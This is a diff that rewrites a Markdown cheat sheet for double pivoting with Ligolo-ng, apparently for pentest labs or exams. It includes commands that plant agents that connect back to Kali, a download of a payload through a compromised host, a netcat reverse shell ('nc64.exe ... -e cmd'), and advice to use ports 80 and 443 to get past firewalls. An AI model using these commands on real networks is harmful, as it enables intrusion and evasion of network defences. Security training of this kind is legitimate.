@@ -1,237 +1,226 @@
-## Setup with your configuration
+ **Overview**
+Ligolo-ng is a tunneling/pivoting tool that gives **routable access** to networks behind a compromised host, without proxychains. It has two parts:
 
-TUN0 IP (Kali VPN): 
+- **Proxy**: runs on the Kali host. This is the server that agents connect back to, and where tunnels/routes are controlled from an interactive console.
+- **Agent**: a small binary dropped on the compromised target. It connects back to the proxy and acts as the relay for traffic.
 
-1st machine EXTERNAL IP: 
+Instead of SOCKS-proxying each tool individually, Ligolo creates a **TUN interface** on the Kali machine (e.g. `tunnel1`). Once a route is added on Kali pointing a target subnet at that TUN interface, your traffic is transparently encapsulated, sent through the agent, and injected into the real network on the other side — so you can run `nmap`, `netexec`, `smbclient`, etc. **natively**, like you're sitting on that subnet.
 
-1st machine INTERNAL IP: 
+### Why "layers"?
 
-NOTE: auto-derives 10.10.10.0/24 range
-
-2nd machine EXTERNAL IP: 
-
-2nd machine INTERNAL IP: 
-
-NOTE: auto-derives 11.11.11.0/24 range
-
-Apply to commands
-
-## 1st Pivot on 1st internal range
-
-1) Create and bring up tunnel1 (kali terminal)
-
-NOTE: requires sudo rights
-
-Copy
+Each pivot is a separate hop/layer, and each layer gets its **own TUN interface and its own route** on Kali:
 
 ```
+Kali (10.10.14.14) ──TUN0 (VPN to exam range)
+   │
+   │  agent1 connects back to 10.10.14.14:11601
+   ▼
+Target 1 (dual-homed foothold)
+   External IP: 10.10.10.5   ← reachable from Kali via TUN0
+   Internal IP: 172.16.5.10  ← reachable only from Target 1 itself
+   │
+   │  route added: 172.16.5.0/24 dev tunnel1  (Layer 1)
+   │
+   │  agent2 (on Target 2) connects back to Target 1's internal IP
+   │  because Target 1 is now acting as a relay for that subnet
+   ▼
+Target 2 (second pivot)
+   External/reachable IP: 172.16.5.20 (reachable via tunnel1)
+   Internal IP: 172.16.6.15  ← a DEEPER subnet, invisible from Kali directly
+   │
+   │  route added: 172.16.6.0/24 dev tunnel2  (Layer 2)
+   ▼
+Subnet only Target 2 can see
+```
+
+So: **Layer 1** = your direct pivot (Kali ↔ Target 1's internal network). **Layer 2** = a pivot-through-a-pivot (Kali → tunnel1 → Target 1 → Target 2's internal network via tunnel2). Each new layer needs: a new TUN device, a new agent connecting to the _previous hop's_ reachable IP (not directly to Kali), a `start --tun` in the proxy console, and a new `ip route add` on Kali. Traffic for the deepest subnet transparently rides through every TUN interface stacked on top of it.
+
+---
+
+## Setup — Fill In Your Own Values
+
+|Variable|Value|
+|---|---|
+|TUN0 IP (Kali VPN)|`10.10.14.14`|
+|Target 1 — External IP (reachable from Kali)|`10.10.10.5`|
+|Target 1 — Internal IP|`172.16.5.10`|
+|Target 1 internal range (auto-derived)|`172.16.5.0/24`|
+|Target 2 — External/reachable IP (via tunnel1)|`172.16.5.20`|
+|Target 2 — Internal IP|`172.16.6.15`|
+|Target 2 internal range (auto-derived)|`172.16.6.0/24`|
+
+---
+
+## Pivot 1 — Into Target 1's Internal Range
+
+**1. Create and bring up `tunnel1` on Kali**
+
+```bash
 sudo ip tuntap add user root mode tun tunnel1
 sudo ip link set tunnel1 up
 ```
 
-2) Start Ligolo proxy server on Kali (again sudo rights)
+Creates the virtual network interface Ligolo will route traffic through for this pivot.
 
-Copy
+**2. Start the Ligolo proxy server on Kali**
 
-```
+```bash
 sudo ./proxy -selfcert
 ```
 
-3) Upload agent.exe / agent and connect back to Kali Ligolo Server
+Launches the Ligolo C2-style console and listens for incoming agent connections (self-signed TLS).
 
-NOTE: on the 1st target machine, run the agent.exe / agent to connect to your TUN0 IP
+**3. Run the agent on Target 1, connecting back to Kali's TUN0 IP**
 
-Copy
-
-```
+```powershell
 .\agent.exe -connect 10.10.14.14:11601 -ignore-cert
 ```
 
-Copy
-
-```
+```bash
 ./agent -connect 10.10.14.14:11601 -ignore-cert
 ```
 
-4) In Ligolo proxy ui: select the agent and start tunnel1
+The agent phones home to your proxy over the VPN-reachable external IP, establishing Layer 1.
 
-Note: once connected press Enter and select the agent with arrows, then run:
-
-Copy
+**4. In the proxy console, select the agent and bind it to `tunnel1`**
 
 ```
 start --tun tunnel1
 ```
 
-5) Add route to the target subnet
+Attaches the live agent session to the local TUN interface, making the tunnel active.
 
-Note: this command is done in a new Kali terminal
+**5. Route Target 1's internal subnet through `tunnel1` (new Kali terminal)**
 
-Copy
-
-```
+```bash
 sudo ip route add 172.16.5.0/24 dev tunnel1
 ```
 
-6) Listener on tunnel1
+Tells Kali's kernel: any traffic for `172.16.5.0/24` should go out via `tunnel1` (and therefore through the agent on Target 1).
 
-Note: lets new hosts reach the proxy to establish tunnels
-
-Copy
+**6. Add a listener on `tunnel1`**
 
 ```
 listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 ```
 
-7) Test reachability using netexec
+Opens a listening port _inside_ Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to your local proxy port — this is what lets a second agent (deeper in the network) dial back in.
 
-Copy
+**7. Verify reachability**
 
-```
+```bash
 netexec smb 172.16.5.0/24
 ```
 
-## 2nd Pivot on 2nd internal range
+Confirms your route/tunnel works by sweeping SMB across the newly reachable subnet.
 
-1) Create and bring up tunnel2 (kali terminal)
+---
 
-NOTE: repeating the first steps but for tunnel2 now as follows
+## Pivot 2 — Into Target 2's Internal Range (Pivot Through the Pivot)
 
-Copy
+**1. Create and bring up `tunnel2` on Kali**
 
-```
+```bash
 sudo ip tuntap add user root mode tun tunnel2
 sudo ip link set tunnel2 up
 ```
 
-2) Connect new agent (from 2nd target) to 1st target internal IP
+A second, separate TUN interface — one per layer, so routes don't collide.
 
-Copy
+**2. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
 
-```
+```powershell
 .\agent.exe -connect 172.16.5.10:11601 -ignore-cert
 ```
 
-3) Once connected in the proxy UI, select with the arrows the new connection that appeared in proxy and hit enter
+Target 2 can't reach Kali directly — it can only reach Target 1 — so it dials the listener you opened in step 6 above, which proxies the connection back to your Ligolo console.
 
-NOTE: make sure you are on the right connection.Once entered connect to tunnel2 with:
-
-Copy
+**3. In the proxy console, select the new agent session and bind it to `tunnel2`**
 
 ```
 start --tun tunnel2
 ```
 
-4) Add route to 2nd internal subnet
+Make sure you select the correct (new) session before running this — this activates Layer 2.
 
-NOTE: using the 2nd target internal IP
+**4. Route Target 2's internal subnet through `tunnel2`**
 
-Copy
-
-```
+```bash
 sudo ip route add 172.16.6.0/24 dev tunnel2
 ```
 
-5) Add listeners for whitelisted ports (443, 80) - PORT FORWARDING STEP
+Now traffic for `172.16.6.0/24` is sent through Layer 2 (which itself rides on top of Layer 1).
 
-NOTE: using whitelisted ports like 443, 80 (this will work most of the time)
-
-Copy
+**5. Add listeners for commonly-whitelisted ports (port forwarding step)**
 
 ```
 listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
-```
-
-Copy
-
-```
 listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 ```
 
-6) Download from 2nd target using 1st internal
+Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali — useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
 
-Copy
+**6. Pull a file from Kali through Target 1's internal IP**
 
-```
+```powershell
 wget http://172.16.5.10/ph03n1x -outfile ph03n1x
 ```
 
-7) Catch reverse shell from 2nd target on your Kali IP
+Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever you're hosting on Kali (e.g. `python3 -m http.server`).
 
-NOTE: using whitelisted ports like 443, 80 (this will work most of the time)
+**7. Catch a reverse shell from Target 2**
 
-Copy
-
-```
+```powershell
 nc64.exe 172.16.5.10 443 -e cmd
 ```
 
-8) Test reachability on 2nd subnet
+Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to your local `nc` listener on Kali.
 
-Copy
+**8. Verify reachability on the second subnet**
 
-```
+```bash
 netexec smb 172.16.6.0/24
 ```
 
-## Local Port Forwarding to your Kali
+Confirms Layer 2 is working end-to-end.
 
-**Have you found a website that’s accesible only from the target or a service that runs only on the target machine?**
+---
 
-**Then it’s time to do a local port forwading, fast and easy, where you don’t need proxychains to reach it!** 
+## Local Port Forwarding to Kali (Reach a Single Internal Service — No Proxychains)
 
-**Works in terminal (with any tool to be reached) and Firefox (if it’s a website)**
+Use this when you just need one internal-only service/port (e.g. an internal web app) reachable directly from a Kali tool or Firefox.
 
-1) On your Kali terminal, create a new network called ligolo
+**1. Create a dedicated TUN interface**
 
-NOTE: requires sudo rights
-
-Copy
-
-```
+```bash
 sudo ip tuntap add user root mode tun ligolo
-```
-
-Copy
-
-```
 sudo ip link set ligolo up
 ```
 
-2) Connect agent to your proxy
+**2. Connect the agent to your proxy (TUN0 IP)**
 
-NOTE: this uses your TUN0 IP dynamically
-
-Copy
-
-```
+```powershell
 .\agent.exe -connect 10.10.14.14:11601 -ignore-cert
 ```
 
-3) In proxy UI, select the new connection and attach it to ligolo
-
-Copy
+**3. In the proxy console, bind the session to `ligolo`**
 
 ```
 start --tun ligolo
 ```
 
-4) Add the magic route to access all internal ports locally on Kali
+**4. Add the "magic" route**
 
-Copy
-
-```
+```bash
 sudo ip route add 240.0.0.1/32 dev ligolo
 ```
 
-Now you can access any local port directly via `240.0.0.1` from Kali
+`240.0.0.1` is a special Ligolo address representing "the agent's localhost." Any port the agent can reach on `127.0.0.1` (its own loopback) becomes reachable from Kali at `240.0.0.1`, with no proxychains required.
 
-5) Verify forwarding with Nmap
+**5. Verify with Nmap**
 
-NOTE: you should see the local ports running on the target (previously visible only on the target itself). Now they are reachable from Kali without proxychains.
-
-Copy
-
-```
+```bash
 nmap -p- 240.0.0.1
 ```
+
+You should see ports that were previously only visible from the target itself — now directly scannable/usable from Kali.
